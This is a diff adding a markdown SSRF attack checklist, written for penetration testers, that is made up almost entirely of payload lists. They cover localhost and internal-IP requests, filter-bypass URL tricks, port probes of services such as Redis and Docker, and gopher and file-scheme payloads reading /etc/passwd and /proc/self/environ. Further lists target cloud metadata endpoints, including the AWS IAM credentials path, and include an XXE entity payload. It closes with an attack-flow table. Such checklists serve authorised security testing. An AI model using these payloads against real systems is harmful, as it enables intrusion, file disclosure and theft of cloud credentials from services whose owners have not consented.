@@ -1,0 +1,252 @@
+- 📋 Basic SSRF Tests
+- 📚 URL Parsing Tricks
+- 🛠️ WAF/Firewall Bypass Tricks
+- 🔥 Advanced SSRF (Gopher, FTP, File, Redis, etc.)
+- 🎯 SSRF to RCE chains
+- 🌍 Cloud metadata access (AWS, GCP, Azure)
+- 🎯 Automation tips
+
+---
+
+# ⚡ COMPLETE SSRF CHECKLIST
+
+---
+
+# 🧩 1. **Identify Potential SSRF Input Points**
+✅ Look for parameters that take URLs or IPs:
+```
+url=
+uri=
+path=
+domain=
+dest=
+redirect=
+next=
+data=
+reference=
+site=
+image_url=
+img=
+callback=
+continue=
+feed=
+host=
+open=
+link=
+file=
+upload_url=
+load_url=
+proxy=
+api=
+outUrl=
+```
+
+---
+
+# 🧩 2. **Basic SSRF Payloads**
+✅ Try simple requests:
+
+```
+http://localhost
+http://127.0.0.1
+http://0.0.0.0
+http://[::1]
+http://2130706433  (Decimal IP of 127.0.0.1)
+http://0177.0.0.1  (Octal IP of 127.0.0.1)
+http://localhost:80
+http://127.0.0.1:80
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:5000
+```
+
+---
+
+# 🧩 3. **Internal Network SSRF Discovery**
+✅ Try accessing internal IP ranges:
+
+```
+http://169.254.169.254/         (AWS metadata)
+http://169.254.169.254/latest/meta-data/
+http://192.168.0.1
+http://10.0.0.1
+http://172.16.0.1
+http://127.0.0.1/admin
+http://localhost/admin
+http://10.10.10.10:2375/version  (Docker API)
+```
+
+---
+
+# 🧩 4. **URL Parsing Tricks (WAF Bypass)**
+✅ Try obfuscation and different formats:
+
+```
+http://127.0.0.1@evil.com
+http://evil.com@127.0.0.1
+http://localhost#evil.com
+http://localhost%23evil.com
+http://localhost%2Fevil.com
+http://127.0.0.1%00.evil.com
+http://127.0.0.1%2500.evil.com
+http://0x7f.0x0.0x0.0x1  (Hex IP)
+http://0177.1
+```
+
+---
+
+# 🧩 5. **Port Targeting (Service Fingerprinting)**
+✅ Test different ports:
+
+```
+127.0.0.1:22       (SSH)
+127.0.0.1:80       (HTTP)
+127.0.0.1:443      (HTTPS)
+127.0.0.1:3306     (MySQL)
+127.0.0.1:5000     (Flask)
+127.0.0.1:6379     (Redis)
+127.0.0.1:11211    (Memcached)
+127.0.0.1:27017    (MongoDB)
+127.0.0.1:8080     (Admin panels)
+```
+
+---
+
+# 🧩 6. **Out-of-Band (OAST) SSRF Detection**
+✅ Use external interaction servers:
+
+```
+http://your-burp-collaborator.net
+http://your-oast-domain.com
+http://your-requestbin.net
+http://your-dnslog.cn
+```
+_(Check for DNS, HTTP, or FTP interactions)_
+
+---
+
+# 🧩 7. **Advanced SSRF Protocols**
+✅ Try exotic protocols for advanced attack chains:
+
+```
+gopher://127.0.0.1:80/_GET / HTTP/1.0
+ftp://127.0.0.1
+file:///etc/passwd
+dict://127.0.0.1:2628/
+smb://127.0.0.1/
+ldap://127.0.0.1/
+tftp://127.0.0.1/
+dns://127.0.0.1/
+```
+
+---
+
+# 🧩 8. **SSRF to Local File Read**
+✅ Try accessing file schemes:
+
+```
+file:///etc/passwd
+file:///proc/self/environ
+file:///windows/win.ini
+file:///c:/Windows/System32/drivers/etc/hosts
+```
+
+---
+
+# 🧩 9. **SSRF to Cloud Metadata**
+✅ Access cloud provider metadata:
+
+### AWS:
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+### GCP:
+```
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+### Azure:
+```
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+Headers: Metadata: true
+```
+
+---
+
+# 🧩 10. **Bypass URL Validation/Filters**
+✅ Play with payload crafting:
+
+```
+127.0.0.1
+127.0.0.1:80
+127.0.0.1./
+127.0.0.1..\
+localhost/
+localhost./
+%09localhost
+%00localhost
+%0alocalhost
+http:127.0.0.1
+//127.0.0.1/
+///127.0.0.1//
+```
+
+---
+
+# 🧩 11. **Try SSRF through POST Body / JSON / XML**
+✅ Not only query params!
+
+**POST/JSON examples:**
+```json
+{
+  "url": "http://127.0.0.1"
+}
+```
+**XML Payloads (for XXE+SSRF):**
+```xml
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1"> ]>
+<foo>&xxe;</foo>
+```
+
+---
+
+# 🧩 12. **Detect SSRF via Response Time / Errors**
+✅ Timing attacks if no direct feedback:
+
+- Access non-routable IPs to cause timeout (`10.255.255.1`)
+- Observe differences in **response size**, **response delay**, or **error message** when accessing internal vs external addresses.
+
+---
+
+# 🧩 13. **SSRF Tools for Automation**
+✅ Tools you can use:
+
+- **ffuf** (URL fuzzing)
+- **ParamSpider** (find URL parameters)
+- **Burp Collaborator** (OAST)
+- **Interactsh** (self-hosted OAST server)
+- **Dnsbin/requestbin** (monitor external DNS/HTTP hits)
+- **Knoxss** (online SSRF scanner)
+- **SSRFmap** (auto exploitation into AWS creds, Redis injection, etc.)
+
+---
+
+# 🎯 SSRF FULL ATTACK FLOW CHECKLIST
+
+| Step | Action |
+|:----:|:-------|
+| 1 | Identify parameters taking URLs/IPs |
+| 2 | Test localhost, 127.0.0.1 |
+| 3 | Test internal ranges (10.x, 192.168.x, 172.16.x) |
+| 4 | Obfuscate URLs (%2e, %2f, @, #, Null bytes) |
+| 5 | Target different ports (22, 80, 443, 3306) |
+| 6 | Use external interaction servers (DNS, HTTP hits) |
+| 7 | Abuse other protocols (gopher, file, ftp, dict) |
+| 8 | Try reading files (file:///etc/passwd) |
+| 9 | Access Cloud metadata servers |
+| 10 | Test POST, JSON, XML payloads |
+| 11 | Observe timing, errors, blind SSRF |
+| 12 | Automate for scale (ParamSpider, ffuf, Burp) |
+
